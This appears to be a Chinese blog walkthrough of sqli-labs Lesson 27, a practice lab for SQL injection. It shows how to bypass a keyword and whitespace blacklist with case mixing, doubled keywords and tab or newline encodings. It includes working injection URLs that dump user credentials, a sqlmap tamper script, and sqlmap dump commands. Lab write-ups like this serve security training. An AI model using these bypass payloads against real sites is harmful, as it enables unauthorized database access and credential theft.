---
title: sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号
date: 2018-10-06 15:18:50
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-27 GET基于错误-你的UNION和SELECT归我所有-字符型单引号

---

## 登录界面

![001](/img/sql/Lesson-27/001.png)

## 分析

切换PHP-5.4.45版本。

```
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);	//过滤 / 和 *
$id= preg_replace('/[--]/',"", $id);	//过滤 -
$id= preg_replace('/[#]/',"", $id);		//过滤 #
$id= preg_replace('/[ +]/',"", $id);	//过滤 空格 和 +
$id= preg_replace('/select/m',"", $id);	//过滤 select  /m:将字符串视为多行
$id= preg_replace('/[ +]/',"", $id);	//过滤 空格 和 +
$id= preg_replace('/union/s',"", $id);	//过滤 union
$id= preg_replace('/select/s',"", $id);	//过滤 select
$id= preg_replace('/UNION/s',"", $id);	//过滤 UNION
$id= preg_replace('/SELECT/s',"", $id);	//过滤 SELECT
$id= preg_replace('/Union/s',"", $id);	//过滤 Union
$id= preg_replace('/Select/s',"", $id);	//过滤 Select
return $id;
}
```



过滤了union和select,但是Mysql的关键字是不区分大小写的,可以混淆大小写绕过。

### 绕过Union和Select

1. 混淆大小写

   使用类似uNion和sElect的随机大小写替换

2. 双写绕过

   union能用类似于ununionion绕过

   select能使selseselectlectect绕过

### 绕过空格

1. /**/ 

被本课的/*过滤

2. `/**_**/`

被本课的/*过滤

3. #加一个换行符`%23%0A`和`-- `加一个换行符`--%0A`

分别被本课的#过滤和--过滤

4. 空白符替换

    %09 TAB键（水平） 可以
    
    %0A 新建一行	可以
    
    %0B TAB键（垂直） 可以
    
    %0C 新的一页	可以
    
    %0D return功能	可以
    
    %A0 空格   这里用不了

5. 用()绕过,意思就是不使用任何空格

## 手注

### 判断类型

`http://192.168.75.132/sql/Less-27/?id=2'and'1`

![002](/img/sql/Lesson-27/002.png)

单引号闭合。

### 获取字段数

`http://192.168.75.132/sql/Less-27/?id=2'%09uNion%09seLect%091,2,3%09and'1`

![003](/img/sql/Lesson-27/003.png)

### 直接上结果

`http://192.168.75.132/sql/Less-27/?id=1'%09and%091=2%09uNion%09seLect%091,(seLect%09group_concat(id,'~',username,'~',password)%09from%09security.users%09),3%09and'1`

![004](/img/sql/Lesson-27/004.png)

## SQLMAP

这次跑的有点久,多了一个UnionSelect.py绕过union和select。

```
#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    Replaces union to ununionion,select to selseselectlectect
    >>> tamper('union select')
    'ununionion selseselectlectect'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)(union)", r"ununionion", re.sub(r"(?i)(select)", "selseselectlectect", payload))

    return retVal
```



```
UnionSelect.py：将union替代ununionion,select替代selseselectlectect
space0A.py	：将空格替代为%0A
count.py	：将count(*)替换成count(1)
```

`python sqlmap.py -u "http://192.168.75.132/sql/Less-27/?id=1" --technique E --dbms mysql --threads 10 --method GET --tamper "UnionSelect.py,space0A.py,count.py" --flush-session --fresh-queries -v 3`

![005](/img/sql/Lesson-27/005.png)

![006](/img/sql/Lesson-27/006.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-27/?id=1" --technique E --dbms mysql --threads 10 --method GET --tamper "UnionSelect.py,space0A.py,count.py" --dbs`

![007](/img/sql/Lesson-27/007.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-27/?id=1" --technique E --dbms mysql --threads 10 --method GET --tamper "UnionSelect.py,space0A.py,count.py" -D security --tables`

![008](/img/sql/Lesson-27/008.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-27/?id=1" --technique E --dbms mysql --threads 10 --method GET --tamper "UnionSelect.py,space0A.py,count.py" -D security -T users --columns --dump`

![009](/img/sql/Lesson-27/009.png)